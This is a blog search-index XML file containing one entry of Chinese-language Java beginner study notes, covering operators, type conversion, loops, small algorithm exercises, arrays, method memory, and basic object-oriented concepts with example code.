<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Java学习笔记</title>
    <url>/2023/03/06/Java%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><h2 id="Intellij快捷关键字"><a href="#Intellij快捷关键字" class="headerlink" title="Intellij快捷关键字"></a>Intellij快捷关键字</h2><p>sout：快速生成system.out输出语句</p>
<p>100.fori：以变量i为计数快速生成循环100次的for循环</p>
<p>数组名.fori：以变量i为计数快速生成遍历数组的循环</p>
<p>psvm：快速生成静态main方法</p>
<p>Ctrl + Alt + M：快速从代码中提取方法并生成方法</p>
<p>Alt + INSERT -&gt; Constructor：快速生成构造函数</p>
<p>Alt + INSERT -&gt; getter and setter：快速生成JavaBean的设置器和获取器</p>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="加"><a href="#加" class="headerlink" title="加"></a>加</h3><p><strong>数字相加：</strong>直接运算，遵从隐式转换规则；</p>
<p><strong>字符串相加：</strong>只要有字符串参与运算时，就变成连接符，不再进行加运算；从左到右逐个执行；</p>
<p><strong>字符相加：</strong>字符之间或与数字进行运算时，会先转换为对应的ascii码值再进行运算：<code>1 + &#39;a&#39; = 98</code>；</p>
<h3 id="自增自减"><a href="#自增自减" class="headerlink" title="自增自减"></a>自增自减</h3><ul>
<li>单独一行使用时++a和a++相同</li>
<li>参与了计算时，++a先运算再赋值，a++先赋值再运算</li>
</ul>
<h3 id="拓展赋值运算符-、-等"><a href="#拓展赋值运算符-、-等" class="headerlink" title="拓展赋值运算符+&#x3D;、-&#x3D;等"></a>拓展赋值运算符+&#x3D;、-&#x3D;等</h3><ul>
<li>先将左边与右边进行运算，再赋值给左边：<code>a += 1</code>  》 <code>a = a + 1</code></li>
<li>包含了强制类型转换：<code>short a = 1; a += 1;</code> 相当于 <code>a = (short)(a + 1);</code></li>
</ul>
<h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><ul>
<li>&#x3D;&#x3D;、!&#x3D;、&gt;&#x3D;、&lt;&#x3D;等</li>
<li>最后的值都是布尔类型</li>
</ul>
<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><ul>
<li><code>&amp;</code>：两边都true才为true；<code>|</code>：两边都false才为false；<code>^</code>：两边相同则为false，不同则为true；<code>!</code>：取相反值；</li>
</ul>
<h3 id="短路逻辑运算"><a href="#短路逻辑运算" class="headerlink" title="短路逻辑运算"></a>短路逻辑运算</h3><ul>
<li><code>&amp;&amp;</code>和<code>||</code>，先判断左边的条件，如果已经能确定最终结果了（注意：逻辑与，左边为false，则整句为false；逻辑或，左边为true，则整句为true），则右边直接不参与执行（如果有自增运算符则不会生效），起到了短路的效果，可以提高程序运行效率</li>
</ul>
<img src="/image/image-20230211172910961.png" alt="image-20230211172910961" style="zoom: 50%;" />

<h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><img src="/image/image-20230211174212690.png" alt="image-20230211174212690" style="zoom: 67%;" />

<ul>
<li>小括号优先级最高</li>
</ul>
<h3 id="原码补码反码"><a href="#原码补码反码" class="headerlink" title="原码补码反码"></a>原码补码反码</h3><ul>
<li><p>原码：十进制数据的二进制表现，最左边一位符号位（0正1负），计算规则：<code>8(00001000) + 1 = 9(00001001)</code>；但在计算负数时<code>-1(10000001) + 1 = -2(10000010)</code>会产生错误的结果</p>
</li>
<li><p>反码：为了解决原码计算负数会出错的问题，计算规则：正数反码不变，负数符号位不变，数值取反（0&#x2F;1互换），原码<code>-7(10000111)</code>取反码<code>-7(11111000)</code>计算<code>-7(11111000) + 1 = (11111001)</code>再取反码<code>-6(10000110)</code>，最终得到正确结果；但在跨零的时候<code>-0(10000000) + 1 = +0(00000000)</code>仍然会产生错误的结果</p>
</li>
<li><p>补码：解决0有两种表现形式（10000000&#x2F;00000000）产生的报错，计算规则：在反码的基础上往前进1，原码<code>-4(10000100)</code>反码<code>11111011</code>补码<code>-4(11111100) + 5 = 1(00000001)</code>；特殊：-128只有补码，没有原码和补码；计算机中的存储和计算都是以补码的形式</p>
</li>
</ul>
<h3 id="按位运算符"><a href="#按位运算符" class="headerlink" title="按位运算符"></a>按位运算符</h3><ul>
<li>逻辑与：按二进制位进行逻辑与运算，位数不够补0，<code>200 &amp; 10 = 11001000 &amp; 00001010 = 00001000 = 8</code>；逻辑或同理</li>
<li>左移：二进制位向左移动，低位补零：<code>200 &lt;&lt; 2 = 0000|11001000 &lt;&lt; 2 = 0011|00100000 = 800</code>；右移反之，高位补0或者1（正负数不同）；无符号右移一律补零</li>
</ul>
<h2 id="隐式类型转换"><a href="#隐式类型转换" class="headerlink" title="隐式类型转换"></a>隐式类型转换</h2><ul>
<li><p>自动数据转换，取值范围小的数据类型自动向取值范围大的数据类型转换</p>
</li>
<li><p><code>byte &lt; shot &lt; int &lt; long &lt; float &lt; double</code></p>
</li>
<li><p>byte、short、char类型进行运算时都会先转换成int类型再进行运算</p>
</li>
</ul>
<h2 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h2><ul>
<li>int a &#x3D; (int)String</li>
<li>数据会有一定程度的损失</li>
</ul>
<h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><h3 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h3><img src="/image/image-20220429122054874.png" alt="image-20220429122054874" style="zoom:80%;" />

<ul>
<li>default为默认的分支，可以写在任意位置，但需要保证程序可读性</li>
<li>break可以跳出switch分支，如果不写可能导致case穿透（执行完了对应case没有break，会继续向下执行case里面的语句，直到结束或发现break），但在某些情况下也可以利用case穿透来简化代码，例如上图</li>
<li>JDK12新特性：可以在case后面使用<code>case 1 -&gt; &#123;语句&#125;</code>，可以省略break只执行大括号里的语句</li>
</ul>
<h3 id="循环语句中的思想"><a href="#循环语句中的思想" class="headerlink" title="循环语句中的思想"></a>循环语句中的思想</h3><ul>
<li>循环次数快速判断：<code>i = 1; i &lt;= 5; i++;</code>时循环五次，<code>i = 1; i &lt; 5; i++;</code>时循环四次；<strong>带等加一，不等不变</strong>；</li>
<li>累加思想；设定一个统计变量用以计数，如count，决定循环次数</li>
<li>知道循环次数用for，不确定循环次数可以用while</li>
</ul>
<h3 id="while循环和for循环"><a href="#while循环和for循环" class="headerlink" title="while循环和for循环"></a>while循环和for循环</h3><img src="/image/image-20230215170714711.png" alt="image-20230215170714711" style="zoom:80%;" />

<img src="/image/image-20230215170801089.png" alt="image-20230215170801089" style="zoom:80%;" />

<img src="/image/image-20230215170943203.png" alt="image-20230215170943203" style="zoom:80%;" />

<h3 id="算法练习——回文数"><a href="#算法练习——回文数" class="headerlink" title="算法练习——回文数"></a>算法练习——回文数</h3><img src="/image/image-20230215174449863.png" alt="image-20230215174449863" style="zoom:80%;" />

<ul>
<li>获取对应位数上的数字，个位：<code>x % 10</code>，十位：<code>x / 10 % 10</code>，百位：<code>x / 100 % 10</code>，以此类推</li>
<li>获取倒序数字：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">12345</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x != <span class="number">0</span>)&#123;              <span class="comment">//通过循环，从右到左逐位获取数字</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">ge</span> <span class="operator">=</span> x % <span class="number">10</span>;        <span class="comment">//获取个位数，此时ge=5</span></span><br><span class="line">            x = x / <span class="number">10</span>;             <span class="comment">//获取倒数第二个数字，这一步是为了去掉已经记录的个位数，此时x=1234</span></span><br><span class="line">            num = num * <span class="number">10</span> + ge;    <span class="comment">//这一步乘10是为了把最右边的个位数换到最前面，此时num=5</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;x的倒序数为：&quot;</span> + num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="算法练习——不使用-求商和余数"><a href="#算法练习——不使用-求商和余数" class="headerlink" title="算法练习——不使用*&#x2F;%求商和余数"></a>算法练习——不使用*&#x2F;%求商和余数</h3><img src="/image/image-20230215181747911.png" alt="image-20230215181747911" style="zoom:80%;" />

<ul>
<li>思路：可以使用循环来递减，通过减的次数来得到商和余数，只要被除数≥除数就一直循环</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">chued</span> <span class="operator">=</span> <span class="number">101</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">chu</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">shang</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">yu</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (chued &gt;= chu)&#123;</span><br><span class="line">            chued = chued - chu;</span><br><span class="line">            yu = chued;</span><br><span class="line">            shang++;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;商：&quot;</span> + shang);</span><br><span class="line">        System.out.println(<span class="string">&quot;余数：&quot;</span> + yu);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="跳转控制语句"><a href="#跳转控制语句" class="headerlink" title="跳转控制语句"></a>跳转控制语句</h3><ul>
<li>continue：停止本次循环，直接进入下次循环</li>
<li>break：停止整个循环</li>
</ul>
<h3 id="算法练习——求平方根"><a href="#算法练习——求平方根" class="headerlink" title="算法练习——求平方根"></a>算法练习——求平方根</h3><img src="/image/image-20230215184127824.png" alt="image-20230215184127824" style="zoom:80%;" />

<ul>
<li>思路：从1开始循环，用i的平方跟目标数字进行比较，如果一样就是平方根；如果小于就继续往后判断；如果大于，那么前一个数字i-1就是平方根的整数部分</li>
</ul>
<h3 id="算法练习——判断质数"><a href="#算法练习——判断质数" class="headerlink" title="算法练习——判断质数"></a>算法练习——判断质数</h3><ul>
<li>思路：质数只能被1和本身整除；写一个循环，从2开始，到number-1为止，一直用这个数和number求余，遇到余数为0的时候就说明能被其他数整除，结束整个循环，并说明该数不是质数，否则一直循环下去直到自然结束，说明该数是质数；<strong>设置一个flag</strong>，初始为true，用以确认循环中是否有某一次被其他数整除，如果有就标记flag为false，最后通过flag进行判断</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">11</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt; number; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (number % i == <span class="number">0</span>)&#123;</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">                System.out.println(number+<span class="string">&quot;不是质数&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag)&#123;</span><br><span class="line">            System.out.println(number+<span class="string">&quot;是质数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="算法练习——猜随机数"><a href="#算法练习——猜随机数" class="headerlink" title="算法练习——猜随机数"></a>算法练习——猜随机数</h3><p>随即生成1~100的随机数，并判断猜测得对不对</p>
<ul>
<li>思路：导入random包，限制随机数范围（包头不包尾，包左不包右）；<code>random.nextInt(101)</code>只能限定范围0到100，要生成1~100，可以使用<code>random.nextInt(100) + 1</code>即可生成</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">random_number</span> <span class="operator">=</span> random.nextInt(<span class="number">100</span>) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.print(<span class="string">&quot;请输入你猜测的数字：&quot;</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> s.nextInt();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (number &gt; random_number)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;猜测结果过大&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (number &lt; random_number) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;猜测结果过小&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;生成的随机数为：&quot;</span> + random_number);</span><br><span class="line">                System.out.println(<span class="string">&quot;猜测成功&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ul>
<li>定义：一种容器，可以用来存储同种类型的不同数据</li>
</ul>
<img src="/image/image-20230219170202981.png" alt="image-20230219170202981" style="zoom:80%;" />

<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p><strong>静态初始化</strong></p>
<p>完整格式：<code>数据类型[] 数组名 = new 数据类型[] &#123;1, 2, 3&#125;</code></p>
<p>简化格式：<code>数据类型[] 数组名 =  &#123;1, 2, 3&#125;</code></p>
<p><strong>动态初始化</strong></p>
<p>完整格式：<code>数据类型[] 数组名 = new 数据类型[数组的长度];</code></p>
<p>默认初始化值：引用数据null，整数数据0，小数数据0.0，字符类型<code>\u0000</code>，布尔类型false</p>
<p><strong>区别</strong></p>
<img src="/image/image-20230219173955877.png" alt="image-20230219173955877" style="zoom: 67%;" />

<img src="/image/image-20230219174021510.png" alt="image-20230219174021510" style="zoom:67%;" />

<h3 id="访问数组元素"><a href="#访问数组元素" class="headerlink" title="访问数组元素"></a>访问数组元素</h3><ul>
<li>索引从0开始，访问第几个元素，索引就要减一</li>
<li>访问格式：<code>System.out.println(arr[0]);</code></li>
<li>赋值同理：<code>arr[0] = 100;</code></li>
<li>数组的长度属性调用方式：<code>数组名.length</code></li>
</ul>
<h3 id="数组遍历"><a href="#数组遍历" class="headerlink" title="数组遍历"></a>数组遍历</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> [] arr1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            System.out.println(arr1[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="数组的常见操作"><a href="#数组的常见操作" class="headerlink" title="数组的常见操作"></a>数组的常见操作</h3><p><strong>求最值</strong></p>
<ul>
<li>思路：遍历数组获取每一个元素；定义max变量依次与每个元素比较，如果比max大则用max记录；max的值应该是数组里的值，否则如果全是负数，最终获取到的值可能是0；</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> arr1[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr1[i] &gt; max)&#123;</span><br><span class="line">                max = arr1[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;数组中的最大值是：&quot;</span> + max);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>遍历随机数数组求和</strong></p>
<ul>
<li>思路：先定义并动态初始化一个数组；循环生成十个随机数，依次遍历数组元素并赋值；定义sum变量循环求和</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr1 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class="line">            arr1[i] = r.nextInt(<span class="number">100</span>) + <span class="number">1</span>;</span><br><span class="line">            System.out.println(arr1[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class="line">            sum = sum + arr1[i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;10个随机数的和为：&quot;</span> + sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>遍历随机数数组求平均值</strong></p>
<ul>
<li>思路：在求和的基础上除以数组的长度</li>
</ul>
<p><strong>求数组中小于平均值的数据个数</strong></p>
<p>- </p>
<ul>
<li>思路：定义一个count变量，循环，如果比平均值小，则count++，最后打印count</li>
</ul>
<p><strong>交换数组首尾索引对应的元素</strong></p>
<ul>
<li>思路：定义两个变量<code>i = 0,j = arr1.length - 1;</code>先交换首尾（索引为0和索引为数组长度-1），再交换第二个和倒数第二个（索引为1和索引为数组长度-2），此时i++，j–，直到i不再小于j为止；最后遍历数组打印出来即可</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr1 = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>,j = arr1.length - <span class="number">1</span>; i &lt; j; i++, j--)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr1[i];</span><br><span class="line">            arr1[i] = arr1[j];</span><br><span class="line">            arr1[j] = temp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class="line">            System.out.print(arr1[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="数组地址值"><a href="#数组地址值" class="headerlink" title="数组地址值"></a>数组地址值</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> [] arr1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">        <span class="type">double</span> [] arr2 = &#123;<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>&#125;;</span><br><span class="line">        System.out.println(arr1);</span><br><span class="line">        System.out.println(arr2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/image/image-20230219171307310.png" alt="image-20230219171307310"></p>
<ul>
<li>[：代表该地址是个数组类型</li>
<li>I，D：i代表int类型，d代表double类型</li>
<li>@：间隔符号</li>
<li>最后的八位：数组真正的十六进制地址值</li>
</ul>
<h3 id="数组的内存"><a href="#数组的内存" class="headerlink" title="数组的内存"></a>数组的内存</h3><p><strong>Java内存分配</strong></p>
<img src="/image/image-20230219182820645.png" alt="image-20230219182820645" style="zoom:67%;" />

<img src="/image/image-20230219183142034.png" alt="image-20230219183142034" style="zoom: 67%;" />

<p>例：</p>
<img src="/image/image-20230221162007028.png" alt="image-20230221162007028" style="zoom: 67%;" />

<ul>
<li>流程：首先定义main方法时载入栈内存，通过<code>int[] arr</code>定义一个数组，可以记录一个int数组的<strong>地址值</strong>，而直接定义变量记录的是<strong>真实的数据</strong>，因此我们使用输出语句直接打印arr时，输出的只是int数组的地址值；new关键字则在<strong>堆内存</strong>中创建一段内存，通过赋值运算符，将这一段内存地址值赋值给刚刚的arr数组；最后通过arr的索引，先找到arr数组记录的地址，再通过索引找到堆内存中对应地址的数据值：<code>arr[0] -&gt; [I10f87f48[0] -&gt; 0</code></li>
</ul>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><ul>
<li>方法是程序中最小的执行单元</li>
</ul>
<h3 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h3><img src="/image/image-20230221172741216.png" alt="image-20230221172741216" style="zoom:80%;" />

<ul>
<li>同一个类中，方法名相同，参数不同（个数，类型，顺序）的方法都构成重载关系，与返回值无关</li>
</ul>
<h3 id="方法的内存"><a href="#方法的内存" class="headerlink" title="方法的内存"></a>方法的内存</h3><img src="/image/image-20230221175613578.png" alt="image-20230221175613578" style="zoom:80%;" />

<ul>
<li>先进栈的方法后出栈</li>
</ul>
<p><strong>方法传递基本数据类型的内存原理</strong></p>
<img src="/image/image-20230221180410264.png" alt="image-20230221180410264" style="zoom:80%;" />

<p><strong>方法传递引用数据类型的内存原理</strong></p>
<img src="/image/image-20230221180612487.png" alt="image-20230221180612487" style="zoom: 67%;" />

<p><strong>区别</strong></p>
<img src="/image/image-20230221180757255.png" alt="image-20230221180757255" style="zoom:80%;" />

<h3 id="方法的值传递"><a href="#方法的值传递" class="headerlink" title="方法的值传递"></a>方法的值传递</h3><img src="/image/image-20230221181109536.png" alt="image-20230221181109536" style="zoom:80%;" />

<ul>
<li>方法传递基本数据类型时，传递的是真实的数据，形参改变不影响实参的值（因为每个方法使用的都是独立的栈内存，方法执行完毕就出栈，不影响其他方法栈内存里的值）</li>
</ul>
<img src="/image/image-20230221181852197.png" alt="image-20230221181852197" style="zoom:80%;" />

<ul>
<li>方法传递引用数据类型是，传递的是地址值，真正改变的是堆内存中的值，如果有另一个方法也调用了这个地址，那么结果就会受影响（例如<code>main.arr[0] -&gt; I[@001[0] -&gt; 200</code>，则<code>change.arr[0] -&gt; I[@001[0] -&gt; 200</code>）</li>
</ul>
<h2 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h2><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><img src="/image/image-20230227151820873.png" alt="image-20230227151820873" style="zoom:80%;" />

<h3 id="定义类"><a href="#定义类" class="headerlink" title="定义类"></a>定义类</h3><img src="/image/image-20230227154046977.png" alt="image-20230227154046977" style="zoom:80%;" />

<h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><ul>
<li>对象代表什么，就得封装对应的数据，并提供数据相对应的行为</li>
</ul>
<img src="/image/image-20230228165257649.png" alt="image-20230228165257649" style="zoom:80%;" />

<ul>
<li>例如String对象，封装了<code>.length()</code>，<code>.toUpperCase()</code>等方法，可以直接调用：<code>String s = &quot;abcd&quot;; sout(s.length()); -&gt; 4</code></li>
</ul>
<h4 id="private关键字"><a href="#private关键字" class="headerlink" title="private关键字"></a>private关键字</h4><ul>
<li>权限修饰符，只有所在类可以访问</li>
</ul>
<h4 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h4><img src="/image/image-20230306172427491.png" alt="image-20230306172427491" style="zoom:80%;" />

<h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><ul>
<li>在创建对象的时候给成员变量进行赋值</li>
</ul>
<img src="/image/image-20230306191311284.png" alt="image-20230306191311284" style="zoom:80%;" />

<img src="/image/image-20230306191334544.png" alt="image-20230306191334544" style="zoom:80%;" />

<ul>
<li>如果没有写任何构造方法，虚拟机会自动加上一个空参构造方法（看不到），如果已经定义了构造方法，那么虚拟机将不再构造，无法再调用无参构造方法，如需无参构造方法则需要自行定义</li>
</ul>
<img src="/image/image-20230306192039345.png" alt="image-20230306192039345" style="zoom: 67%;" />

<ul>
<li>带参数的构造方法和无参的构造方法，方法名相同，参数不同，称作构造方法的重载</li>
<li>系统会根据参数的个数自动选择重载方法</li>
</ul>
<img src="/image/image-20230306193322365.png" alt="image-20230306193322365" style="zoom: 67%;" />

<h3 id="标准JavaBean类"><a href="#标准JavaBean类" class="headerlink" title="标准JavaBean类"></a>标准JavaBean类</h3><img src="/image/image-20230306200432755.png" alt="image-20230306200432755" style="zoom:80%;" />

<p><strong>主类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.JavaStudy.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;Y5neKO&quot;</span>, <span class="string">&quot;男&quot;</span>, <span class="number">21</span>);</span><br><span class="line">        u.setName(<span class="string">&quot;YS_Neko&quot;</span>);</span><br><span class="line">        System.out.println(u.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>User类</strong></p>
